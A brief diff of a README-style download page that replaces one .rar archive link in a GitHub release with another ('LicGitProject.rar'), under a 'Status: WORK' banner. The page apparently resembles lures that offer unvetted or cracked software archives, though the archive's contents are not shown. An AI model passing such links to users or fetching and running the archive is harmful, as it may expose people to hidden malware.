@@ -4,4 +4,4 @@
 > # 🟢Status: WORK🟢
 ---
 # Download
-### [Download the latest version](https://github.com/iitsguidedd/reimagined-computing-machine/releases/download/Download/LicSotProject.rar)
+### [Download the latest version](https://github.com/iitsguidedd/reimagined-computing-machine/releases/download/Download/LicGitProject.rar)
